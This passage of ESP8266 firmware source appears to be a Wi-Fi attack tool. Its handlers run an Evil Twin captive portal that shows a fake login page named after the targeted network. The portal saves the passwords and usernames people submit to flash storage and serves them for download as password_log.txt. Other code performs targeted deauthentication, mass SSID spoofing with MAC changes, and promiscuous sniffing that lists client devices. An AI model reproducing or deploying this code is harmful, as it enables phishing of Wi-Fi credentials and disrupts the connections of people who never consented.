        ssid.trim();
        if (ssid.length() > 0) {
          massSpoofingSSIDs.push_back(ssid);
        }
        lastIndex = i + 1;
      }
    }
    ...
    if (lastSsid.length() > 0) {
      massSpoofingSSIDs.push_back(lastSsid);
    }

    if (massSpoofingSSIDs.size() > 0) {
      ...
      if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Mass SSID Spoofing started with ") + String(massSpoofingSSIDs.size()) + F(" SSIDs. Current: ") + massSpoofingSSIDs[currentSpoofingIndex] + F(" on Ch: ") + String(currentSpoofingChannel) + F(" MAC: ") + bytesToStr(macToUse, 6));
      webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Mass spoofing started\", \"mass_spoofing_active\": true, \"current_spoofed_ssid\": \"") + massSpoofingSSIDs[currentSpoofingIndex] + F("\"}"));
    } else {
      mass_spoofing_active = false;
      webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No valid SSIDs provided\", \"mass_spoofing_active\": false}"));
    }
  } else {
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No data provided\"}"));
  }
...
void handleApiStopMassSpoofing() { // NEW
    mass_spoofing_active = false;
    // massSpoofingSSIDs.clear(); // Keep the list in memory for potential re-use, clear only on load/save
    ...
    if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Mass SSID Spoofing stopped. Admin AP restarted."));
    webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Mass spoofing stopped\", \"mass_spoofing_active\": false, \"current_spoofed_ssid\": \"N/A\"}"));
}


void handleApiStatus() {
  DynamicJsonDocument doc(512); // Adjusted size
  doc[F("targetSsid")] = _selectedNetwork.ssid;
  doc[F("targetBssid")] = bytesToStr(_selectedNetwork.bssid, 6);
  doc[F("targetChannel")] = _selectedNetwork.ch;
  doc[F("hotspotActive")] = hotspot_active;
  doc[F("deauthActive")] = deauthing_active;
  doc[F("massSpoofingActive")] = mass_spoofing_active;
  doc[F("currentSpoofedSsid")] = (mass_spoofing_active && massSpoofingSSIDs.size() > 0) ? massSpoofingSSIDs[currentSpoofingIndex] : F("N/A");

  doc[F("passwordCount")] = _capturedPasswordsLog.size(); // Use vector size

  doc[F("ipAddress")] = WiFi.softAPIP().toString();
  doc[F("macAddress")] = WiFi.softAPmacAddress();
  ...
  doc[F("uptime")] = uptimeBuffer;

  doc[F("freeHeap")] = ESP.getFreeHeap();
  const size_t TOTAL_HEAP_ESTIMATE = 80 * 1024; // 80KB, adjust as needed for your board
  doc[F("totalHeap")] = TOTAL_HEAP_ESTIMATE;
  doc[F("memoryUsagePercent")] = (100.0 * (TOTAL_HEAP_ESTIMATE - ESP.getFreeHeap())) / TOTAL_HEAP_ESTIMATE;
...
void handleApiLogs() {
  ...
  JsonArray passwordsArray = doc.createNestedArray(F("passwords"));
  for (const String& entry : _capturedPasswordsLog) {
    passwordsArray.add(entry);
  }
  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, F("application/json"), jsonResponse);
...
void handleApiClearLogs() {
  _capturedPasswordsLog.clear(); // Clear vector
  saveCapturedPasswords(); // Clear file as well
  if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Password logs cleared."));
  webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Logs cleared\"}"));
}

void handleApiDownloadLogs() {
  webServer.sendHeader(F("Content-Disposition"), F("attachment; filename=password_log.txt"));
  String logContent = "";
  for (const String& entry : _capturedPasswordsLog) {
    logContent += entry + "\n"; // Reconstruct string with newlines
  }
  webServer.send(200, F("text/plain"), logContent);
}
...
void handleApiFiles() {
  ...
  while (dir.next()) {
    ...
    fileObj[F("name")] = fileName;
    fileObj[F("size")] = fileSize;
    // Determine file type based on extension
    if (fileName.endsWith(F(".html"))) fileObj[F("type")] = F("html");
    else if (fileName.endsWith(F(".css"))) fileObj[F("type")] = F("css");
    else if (fileName.endsWith(F(".js"))) fileObj[F("type")] = F("javascript");
    else if (fileName.endsWith(F(".json"))) fileObj[F("type")] = F("json");
    else if (fileName.endsWith(F(".log"))) fileObj[F("type")] = F("log");
    else if (fileName.endsWith(F(".txt"))) fileObj[F("type")] = F("text");
    else fileObj[F("type")] = F("unknown");
  }
...
void handleApiDeselectNetwork() {
  ...
  _isTargetClientSelected = false; // NEW: Clear selected client
  memset(_targetClientMac, 0, 6);
  deauthing_active = false; // Stop deauth if active
  hotspot_active = false;   // Stop hotspot if active
  mass_spoofing_active = false; // Stop mass spoofing if active
  // massSpoofingSSIDs.clear(); // Keep the list in memory for potential re-use
  currentSpoofingIndex = 0; // Reset index

  // Ensure admin AP is active and correct if Evil Twin or Mass Spoofing was running
  if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Stopping current AP and DNS server for deselection..."));
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100); // Small delay for stability
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  ...
  if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Network deselected. All attacks stopped. Admin AP restarted."));
  webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Network deselected\"}"));
}

// NEW: API to get discovered clients
void handleApiGetClients() {
  DynamicJsonDocument doc(2048); // Adjust size based on expected number of clients
  JsonArray clientsArray = doc.to<JsonArray>();

  cleanupClients(); // Clean up old clients before sending

  for (const _Client& client : _discoveredClients) {
    JsonObject clientObj = clientsArray.createNestedObject();
    clientObj[F("mac")] = bytesToStr(client.mac, 6);
    clientObj[F("lastSeenSSID")] = client.lastSeenSSID;
    clientObj[F("lastSeenTime")] = client.lastSeenTime;
  }
...
// NEW: API to select a client for targeted deauth
void handleApiSelectClient() {
  if (webServer.hasArg(F("plain"))) {
    String body = webServer.arg(F("plain"));
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);
    ...
    String macStr = doc[F("mac")].as<String>();
    bool found = false;
    for (const _Client& client : _discoveredClients) {
      if (bytesToStr(client.mac, 6) == macStr) {
        sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &_targetClientMac[0], &_targetClientMac[1], &_targetClientMac[2],
               &_targetClientMac[3], &_targetClientMac[4], &_targetClientMac[5]);
        _isTargetClientSelected = true;
        found = true;
        if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Selected client for targeted deauth: ") + macStr);
        break;
      }
    }

    if (found) {
      webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Client selected\"}"));
    } else {
      webServer.send(404, F("application/json"), F("{\"success\": false, \"message\": \"Client not found\"}"));
    }
  } else {
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No data provided\"}"));
  }
...
void handleFileUpload() {
  ...
  if (upload.status == UPLOAD_FILE_START) {
    uploadErrorOccurred = false; // Reset flag
    String filename = upload.filename;
    if (!filename.startsWith(F("/"))) filename = F("/") + filename;
    if (appSettings.enableDebugLogs) { Serial.print(F("[FILE] Uploading: ")); Serial.println(filename); }
    SPIFFS.remove(filename); // Remove existing file if it exists
    fsUploadFile = SPIFFS.open(filename, F("w")); // Open the file in write mode
    if (!fsUploadFile) {
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open file for writing during upload: ") + filename);
      uploadErrorOccurred = true; // Set error flag
      return; 
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && !uploadErrorOccurred) { // Check flag before writing
      fsUploadFile.write(upload.buf, upload.currentSize);
    } else if (!fsUploadFile && !uploadErrorOccurred) { // This case should ideally not happen if flag is set
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] File not open for writing during upload (unexpected)."));
      uploadErrorOccurred = true; // Set error flag
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close(); // Close the file only at the end
      if (!uploadErrorOccurred) { // Only send success if no error occurred
        if (appSettings.enableDebugLogs) Serial.println(F("\n[FILE] Upload complete: ") + upload.filename + F(", size: ") + String(upload.totalSize));
        webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"File uploaded successfully\"}"));
      } else {
        if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Upload ended with prior error: ") + upload.filename);
        webServer.send(500, F("application/json"), F("{\"success\": false, \"message\": \"File write error during upload.\"}"));
      }
    } else {
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] File was not properly opened or written to (UPLOAD_FILE_END)."));
      webServer.send(500, F("application/json"), F("{\"success\": false, \"message\": \"File handle error at end of upload.\"}"));
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (fsUploadFile) {
      fsUploadFile.close();
      SPIFFS.remove(upload.filename); // Clean up aborted upload
      if (appSettings.enableDebugLogs) Serial.println(F("[FILE] Upload aborted: ") + upload.filename);
    }
    webServer.send(500, F("application/json"), F("{\"success\": false, \"message\": \"Upload aborted\"}"));
  }
}

void handleFileDelete() {
  if (webServer.hasArg(F("plain"))) { // Expecting JSON body with filename
    String body = webServer.arg(F("plain"));
    ...
    String filename = doc[F("filename")].as<String>();
    if (!filename.startsWith(F("/"))) filename = F("/") + filename;
    if (SPIFFS.exists(filename)) {
      SPIFFS.remove(filename);
      if (appSettings.enableDebugLogs) Serial.println(F("[FILE] Deleted: ") + filename);
      webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"File deleted\"}"));
    } else {
      if (appSettings.enableDebugLogs) Serial.println(F("[WARNING] File not found for deletion: ") + filename);
      webServer.send(404, F("application/json"), F("{\"success\": false, \"message\": \"File not found\"}"));
    }
  } else {
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No data provided\"}"));
  }
...
void handleCaptivePortal() {
  if (!hotspot_active) {
    webServer.sendHeader(F("Location"), F("http://") + apIP.toString() + F("/"), true); // Redirect to main UI if Evil Twin not active
    webServer.send(302, F("text/plain"), "");
    return;
  }
  ...
  if (templateToLoad == F("custom") && SPIFFS.exists(F("/captive_portal_template.html"))) {
      File file = SPIFFS.open(F("/captive_portal_template.html"), F("r"));
      if (file) {
          captivePortalHTML = file.readString();
          file.close();
          if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Serving custom captive portal from SPIFFS."));
      } else {
          if (appSettings.enableDebugLogs) Serial.println(F("[WARNING] Custom template not found in SPIFFS. Falling back to embedded default."));
          captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      }
  } else if (templateToLoad == F("default")) {
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Serving embedded default captive portal template."));
  }
  ...
  // e.g., if (templateToLoad == "facebook") captivePortalHTML = FACEBOOK_TEMPLATE_HTML;
      ...
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      if (appSettings.enableDebugLogs) Serial.println(F("[WARNING] Invalid default captive portal template setting or template not found. Serving embedded default."));
  }
  
  captivePortalHTML.replace(F("{SSID}"), _selectedNetwork.ssid);
  captivePortalHTML.replace(F("{DEVICE_NAME}"), APP_NAME);
  captivePortalHTML.replace(F("{CURRENT_TIME}"), String(millis() / 1000) + F("s")); // Simple uptime for time

  webServer.send(200, F("text/html"), captivePortalHTML);
}

void handleCaptivePortalSubmit() {
  if (webServer.hasArg(F("password"))) {
    String capturedPassword = webServer.arg(F("password"));
    String capturedUsername = webServer.hasArg(F("username")) ? webServer.arg(F("username")) : F("N/A"); // For templates with username field

    // Basic validation: check password length
    if (capturedPassword.length() < 4) { // Example: require at least 4 characters
        if (appSettings.enableDebugLogs) Serial.println(F("[WARNING] Captured password too short, likely invalid."));
        // You might want to redirect to an error page or re-prompt
        String response = F("<!DOCTYPE html><html><head><title>Error</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>");
        response += F("<center><h1>Error!</h1><p>Invalid password. Please try again.</p>");
        response += F("<p><a href=\"/generate_captive_portal\">Go Back</a></p></center></body></html>");
        webServer.send(200, F("text/html"), response);
        return;
    }
    ...
    _capturedPasswordsLog.push_back(String(logBuffer)); // Append to vector
    saveCapturedPasswords(); // Save passwords after capture
    ...
    String response = F("<!DOCTYPE html><html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>");
    response += F("<center><h1>Thank You!</h1><p>Your connection is being established. Please wait...</p>");
    response += F("<p>You may need to reconnect to the network.</p></center></body></html>");
    webServer.send(200, F("text/html"), response);
    ...
    // if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Attempting to connect to real AP with captured password..."));
  } else {
    webServer.send(200, F("text/html"), F("Password not provided."));
  }
}
...
void handleRestart() {
  webServer.send(200, F("text/html"), F("<h1>Restarting Device...</h1><p>The device will restart in a few seconds. Please wait.</p>"));
  delay(2000);
  ESP.restart();
}
...
void loadSettings() {
  ...
  appSettings.defaultCaptivePortalTemplate = F("default");
  appSettings.enableRandomMac = false;
  appSettings.enableChannelHopping = false;
  appSettings.webAdminUsername = F("admin");
  appSettings.webAdminPassword = F("password");
  appSettings.deauthIntervalMs = 1000; // NEW default

  if (SPIFFS.exists(SETTINGS_FILE)) {
    File settingsFile = SPIFFS.open(SETTINGS_FILE, F("r"));
    if (settingsFile) {
      DynamicJsonDocument doc(512); // Optimized size
      DeserializationError error = deserializeJson(doc, settingsFile);
      if (!error) {
        appSettings.adminApSsid = doc[F("adminApSsid")] | appSettings.adminApSsid;
        appSettings.adminApPassword = doc[F("adminApPassword")] | appSettings.adminApPassword;
        appSettings.enableDebugLogs = doc[F("enableDebugLogs")] | appSettings.enableDebugLogs;
        appSettings.defaultCaptivePortalTemplate = doc[F("defaultCaptivePortalTemplate")] | appSettings.defaultCaptivePortalTemplate;
        appSettings.enableRandomMac = doc[F("enableRandomMac")] | appSettings.enableRandomMac;
        appSettings.enableChannelHopping = doc[F("enableChannelHopping")] | appSettings.enableChannelHopping;
        appSettings.webAdminUsername = doc[F("webAdminUsername")] | appSettings.webAdminUsername;
        appSettings.webAdminPassword = doc[F("webAdminPassword")] | appSettings.webAdminPassword;
        appSettings.deauthIntervalMs = doc[F("deauthIntervalMs")] | appSettings.deauthIntervalMs; // NEW
        if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Settings loaded from SPIFFS."));
      } else {
        if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to parse settings JSON. Using defaults."));
      }
      settingsFile.close();
    } else {
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open settings file for reading. Using defaults."));
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Settings file not found. Using default settings."));
    saveSettings(); // Save defaults to file for next boot
  }
}

void saveSettings() {
  File settingsFile = SPIFFS.open(SETTINGS_FILE, F("w"));
  if (settingsFile) {
    DynamicJsonDocument doc(512); // Optimized size
    doc[F("adminApSsid")] = appSettings.adminApSsid;
    doc[F("adminApPassword")] = appSettings.adminApPassword;
    doc[F("enableDebugLogs")] = appSettings.enableDebugLogs;
    doc[F("defaultCaptivePortalTemplate")] = appSettings.defaultCaptivePortalTemplate;
    doc[F("enableRandomMac")] = appSettings.enableRandomMac;
    doc[F("enableChannelHopping")] = appSettings.enableChannelHopping;
    doc[F("webAdminUsername")] = appSettings.webAdminUsername;
    doc[F("webAdminPassword")] = appSettings.webAdminPassword;
    doc[F("deauthIntervalMs")] = appSettings.deauthIntervalMs; // NEW

    if (serializeJson(doc, settingsFile) == 0) {
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to write settings to file."));
    } else {
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Settings saved to SPIFFS."));
    }
    settingsFile.close();
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open settings file for writing."));
  }
}
...
void handleApiSaveSettings() {
  if (webServer.hasArg(F("plain"))) {
    ...
    String newAdminApSsid = doc[F("adminApSsid")] | appSettings.adminApSsid;
    String newAdminApPassword = doc[F("adminApPassword")] | appSettings.adminApPassword;
    bool newEnableDebugLogs = doc[F("enableDebugLogs")] | appSettings.enableDebugLogs;
    String newDefaultCaptivePortalTemplate = doc[F("defaultCaptivePortalTemplate")] | appSettings.defaultCaptivePortalTemplate;
    bool newEnableRandomMac = doc[F("enableRandomMac")] | appSettings.enableRandomMac;
    bool newEnableChannelHopping = doc[F("enableChannelHopping")] | appSettings.enableChannelHopping;
    String newWebAdminUsername = doc[F("webAdminUsername")] | appSettings.webAdminUsername;
    String newWebAdminPassword = doc[F("webAdminPassword")] | appSettings.webAdminPassword;
    unsigned long newDeauthIntervalMs = doc[F("deauthIntervalMs")] | appSettings.deauthIntervalMs; // NEW
    ...
    appSettings.enableRandomMac = newEnableRandomMac;
    appSettings.enableChannelHopping = newEnableChannelHopping;
    appSettings.webAdminUsername = newWebAdminUsername;
    appSettings.webAdminPassword = newWebAdminPassword;
    appSettings.deauthIntervalMs = newDeauthIntervalMs; // NEW
    ...
    if (apSettingsChanged || webAuthSettingsChanged) {
        if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Admin AP or Web Auth settings changed. Restarting AP..."));
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        delay(100); // Small delay for stability
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    ...
    webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Settings saved successfully\"}"));
  } else {
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No data provided\"}"));
  }
}

// --- New: Password Log Management Functions (Implementation) ---
void loadCapturedPasswords() {
  _capturedPasswordsLog.clear(); // Clear existing data
  if (SPIFFS.exists(CAPTURED_PASSWORDS_FILE)) {
    File logFile = SPIFFS.open(CAPTURED_PASSWORDS_FILE, F("r"));
    if (logFile) {
      while (logFile.available()) {
        String line = logFile.readStringUntil('\n');
        line.trim(); // Remove newline and carriage return
        if (!line.isEmpty()) {
          _capturedPasswordsLog.push_back(line);
        }
      }
      logFile.close();
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Loaded captured passwords from SPIFFS."));
    } else {
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open captured passwords file for reading."));
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Captured passwords file not found. Starting fresh."));
  }
}

void saveCapturedPasswords() {
  File logFile = SPIFFS.open(CAPTURED_PASSWORDS_FILE, F("w"));
  if (logFile) {
    for (const String& entry : _capturedPasswordsLog) {
      logFile.println(entry); // Write each entry on a new line
    }
    logFile.close();
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Saved captured passwords to SPIFFS."));
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open captured passwords file for writing."));
  }
}
...
void startMassSpoofingAP(String ssid, uint8_t channel, uint8_t* mac) {
    ...
    if (mac != nullptr) {
        if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Setting AP MAC to: ") + bytesToStr(mac, 6));
...
void loadMassSpoofingSSIDs() {
  massSpoofingSSIDs.clear();
  if (SPIFFS.exists(MASS_SPOOFING_SSIDS_FILE)) {
    File ssidFile = SPIFFS.open(MASS_SPOOFING_SSIDS_FILE, F("r"));
    if (ssidFile) {
      while (ssidFile.available()) {
        String line = ssidFile.readStringUntil('\n');
        line.trim();
        if (!line.isEmpty()) {
          massSpoofingSSIDs.push_back(line);
        }
      }
      ssidFile.close();
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Loaded mass spoofing SSIDs from SPIFFS."));
    } else {
      if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open mass spoofing SSIDs file for reading."));
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Mass spoofing SSIDs file not found."));
  }
}

void saveMassSpoofingSSIDs() {
  File ssidFile = SPIFFS.open(MASS_SPOOFING_SSIDS_FILE, F("w"));
  if (ssidFile) {
    for (const String& ssid : massSpoofingSSIDs) {
      ssidFile.println(ssid);
    }
    ssidFile.close();
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Saved mass spoofing SSIDs to SPIFFS."));
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[ERROR] Failed to open mass spoofing SSIDs file for writing."));
  }
}
...
void handleOTAUpdate() {
  ...
  if (upload.status == UPLOAD_FILE_START) {
    ...
    if (Update.end(true)) { // true to set the size to the current progress
      Serial.printf(F("[OTA] Update Success: %u bytes\n"), upload.totalSize);
    } else {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
...
void handleOTAStart() {
  if (appSettings.enableDebugLogs) Serial.println(F("[OTA] OTA update started!"));
}

void handleOTAProgress(unsigned int progress, unsigned int total) {
  if (appSettings.enableDebugLogs) Serial.printf(F("[OTA] Progress: %u%%\n"), (progress * 100) / total);
}

void handleOTAEnd() {
  if (appSettings.enableDebugLogs) Serial.println(F("[OTA] OTA update finished. Rebooting..."));
}
...
// NEW: Promiscuous Mode Sniffing Implementation
// This is a simplified 802.11 frame header for management frames
struct ieee80211_mgmt_frame {
  ...
  // Followed by variable length body
} __attribute__((packed));

// This is a simplified 802.11 frame header for data frames (QoS Data)
struct ieee80211_data_frame {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t da[6]; // Destination Address
  uint8_t sa[6]; // Source Address
  uint8_t bssid[6]; // BSSID (or TA/RA depending on ToDS/FromDS)
  uint16_t sequence_control;
  uint8_t qos_control[2]; // QoS Control field for QoS Data frames
  // Followed by variable length body
} __attribute__((packed));


void promiscuous_rx_cb(uint8_t *buf, uint16_t len) {
  if (len < 24) return; // Minimum management frame length

  // Get frame control field
  uint16_t frame_control = *(uint16_t*)buf;
  uint8_t frame_type = (frame_control >> 2) & 0x03; // Bits 2-3: Type (0=Management, 1=Control, 2=Data)
  uint8_t frame_subtype = (frame_control >> 4) & 0x0F; // Bits 4-7: Subtype

  // Only interested in Management and Data frames for client discovery
  if (frame_type == 0x00) { // Management Frame
    // Subtypes: 0x00 (Association Request), 0x01 (Association Response), 0x04 (Probe Request), 0x05 (Probe Response), 0x08 (Beacon)
    if (frame_subtype == 0x04) { // Probe Request
      // Probe requests are sent by clients looking for networks.
      // Source Address (SA) is the client's MAC.
      // Destination Address (DA) is usually broadcast (FF:FF:FF:FF:FF:FF) or a specific AP.
      // SSID is in the frame body (Information Elements).
      struct ieee80211_mgmt_frame *mgmt_frame = (struct ieee80211_mgmt_frame *)buf;
      uint8_t* client_mac = mgmt_frame->sa;

      // Extract SSID from Probe Request (if present)
      String ssid = "";
      // The SSID IE is usually at offset 24 (after fixed fields)
      if (len > 24) {
        uint8_t *ie_ptr = buf + 24;
        while (ie_ptr < buf + len) {
          uint8_t element_id = ie_ptr[0];
          uint8_t element_len = ie_ptr[1];
          if (element_id == 0x00) { // SSID Parameter Set
            if (element_len > 0 && element_len <= (buf + len - ie_ptr - 2)) { // Check bounds
              ssid = String((char*)(ie_ptr + 2), element_len);
            }
            break; // Found SSID, no need to parse further IEs
          }
          ie_ptr += (2 + element_len); // Move to next IE
        }
      }
      addOrUpdateClient(client_mac, ssid);
    } else if (frame_subtype == 0x00) { // Association Request
      // Association requests are sent by clients trying to connect to an AP.
      // Source Address (SA) is the client's MAC.
      struct ieee80211_mgmt_frame *mgmt_frame = (struct ieee80211_mgmt_frame *)buf;
      uint8_t* client_mac = mgmt_frame->sa;
      // BSSID is the AP's MAC
      uint8_t* ap_mac = mgmt_frame->bssid;
      // You'd need to map AP MAC to SSID if you want to show the AP name
      // For simplicity, we'll just add the client.
      addOrUpdateClient(client_mac, bytesToStr(ap_mac, 6)); // Use AP MAC as "SSID" for now
    }
  } else if (frame_type == 0x02) { // Data Frame
    // Data frames contain actual network traffic.
    // Source Address (SA) is the sender (client or AP).
    // Destination Address (DA) is the receiver (client or AP).
    // BSSID is the AP's MAC.
    // ToDS (bit 8 of Frame Control) and FromDS (bit 9 of Frame Control) determine address roles.
    // For simplicity, we'll just look at SA and DA.
    struct ieee80211_data_frame *data_frame = (struct ieee80211_data_frame *)buf;
    uint8_t* client_mac_candidate1 = data_frame->sa;
    uint8_t* client_mac_candidate2 = data_frame->da;

    // Heuristic: If SA is not broadcast and not multicast, it's likely a client or AP.
    // If DA is not broadcast and not multicast, it's likely a client or AP.
    // We're primarily interested in client MACs.
    // A simple approach: if SA is not the AP's MAC, it might be a client.
    // This is very basic and can be improved.
    if (!(client_mac_candidate1[0] & 0x01)) { // Check if unicast (not multicast/broadcast)
        addOrUpdateClient(client_mac_candidate1, ""); // SSID unknown from data frame directly
    }
    if (!(client_mac_candidate2[0] & 0x01)) { // Check if unicast
        addOrUpdateClient(client_mac_candidate2, "");
    }
  }
}
...
void addOrUpdateClient(uint8_t* mac, const String& ssid) {
  ...
  if (mac[0] & 0x01) return; // Ignore multicast MACs (LSB of first octet is 1)

  // Ignore our own AP's MAC
  uint8_t softAPMac[6];
  WiFi.softAPmac(softAPMac);
  if (memcmp(mac, softAPMac, 6) == 0) return;

  bool found = false;
  for (auto& client : _discoveredClients) {
    if (memcmp(client.mac, mac, 6) == 0) {
      client.lastSeenTime = millis();
      if (ssid.length() > 0 && client.lastSeenSSID.isEmpty()) { // Update SSID if we just found it
        client.lastSeenSSID = ssid;
      }
      found = true;
      break;
    }
  ...
  if (!found) {
    ...
    newClient.lastSeenSSID = ssid;
    newClient.lastSeenTime = millis();
    _discoveredClients.push_back(newClient);
    if (appSettings.enableDebugLogs) {
      Serial.print(F("[SNIFF] New client discovered: "));
      printMac(newClient.mac);
      Serial.print(F(" (SSID: "));
      Serial.print(newClient.lastSeenSSID);
      Serial.println(F(")"));
    }
  }
}
...
void cleanupClients() {
  ...
  _discoveredClients.erase(
    std::remove_if(_discoveredClients.begin(), _discoveredClients.end(),
                   [currentTime](const _Client& c) {
                     return (currentTime - c.lastSeenTime > CLIENT_TIMEOUT_MS);
                   }),
    _discoveredClients.end());
}

void printMac(uint8_t* mac) {
  Serial.printf(F("%02X:%02X:%02X:%02X:%02X:%02X"), mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}
...
void updateOLEDDisplay() {
  ...
  display.print(F("AP: "));
  if (mass_spoofing_active && massSpoofingSSIDs.size() > 0) { // Show current spoofed SSID
  ...
  if (_selectedNetwork.ssid != "") {
    display.println(_selectedNetwork.ssid.substring(0, min((int)_selectedNetwork.ssid.length(), 10)) + F("...")); // Truncate long SSID
  } else {
  ...
  display.print(deauthing_active ? F("ON") : F("OFF"));
  display.print(F(" Hotspot: "));
  display.println(hotspot_active ? F("ON") : F("OFF"));
